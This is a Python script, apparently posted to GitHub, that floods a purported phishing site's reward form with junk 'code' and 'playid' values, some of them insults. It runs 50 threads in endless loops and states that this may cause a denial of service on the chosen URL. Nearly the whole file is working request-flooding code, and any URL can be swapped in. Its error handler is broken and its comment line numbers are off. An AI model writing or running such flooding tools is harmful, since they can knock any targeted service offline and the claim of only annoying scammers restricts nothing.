import requests
import random
import threading
# [Line 5] Request Link On Selected Site
URL = 'https://redeemcode-phillipines.games/reward.php'  # Just An Example Of Phishing Link
# [Line 7-24] What To Send On The Request Link
Response_1 = [
    'AnoKaHello',
    'HAHAHHAHAScam',
    'AnoThis',
    'MamaMoBlue',
    'TalagaBaSherminPakyu',
    'SML',
    'EdiWaw'
]
Response_2 = [
    '123456789123456789',
    '696969696969696969',
    '000000000000000000',
    '191817161514131211',
    '101010101010101010',
    '120938475612345678',
    '666666666666666666'
]
# [Line 26-50] The Main Request Based On Your Given Link
DATA = {
    'code': f'{random.choice(Response_1)}',
    'playid': f'{random.choice(Response_2)}'
}
# [Line 31-49] The Code Itself
def do_request():  #The Main Code Who Runs The Operation
    while True:
        read = requests.post(url=URL, data=DATA).text
        print(f'[/] Spam Sent Successfully To This {URL} Link')
        print(f'[-] = = = = = = = = = = = = = = = = = = = = ='
              f'{read}'  # Shows The Process/Responses From Line 36
              f'[-] = = = = = = = = = = = = = = = = = = = = =')
def failed_request():  # Shows If The Request Sended Failed, Supposedly...
    if requests.exceptions.ChunkedEncodingError():
        print(f'[X] Spam Sent Failed To This {URL} Link')
# [Line 42-50] Threads To Send Multiple Requests Simultaneously (May Cause "DOS" On The Selected URL On Line 5)
threads = []
for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)
for i in range(50):
    threads[i].start()
for i in range(50):
    threads[i].join()
# [NOTES] Still Don't Know How To Change This Script?, Try Watching This Video I've Found: "https://youtu.be/StmNWzHbQJU" (Some Are Used To Be Based On My Code On This Video)
# [NOTES] If You Want To Copy/Modify My Scrpt, Feel Free To Do It (With Or Without Credits), Thanks. And Also I'm Not Responsible On Any Reliable Lawsuites Againts You When Using My Code!!! "This Is Used Only To Annoy A Bad Hackers :)"...
# [Credits] YT: "https://youtu.be/StmNWzHbQJU" (Some Codes And Ideas On How This Code Will Work)
# [Creator >>> REDFURFOX On Github (https://github.com/RedFurrFox) ]
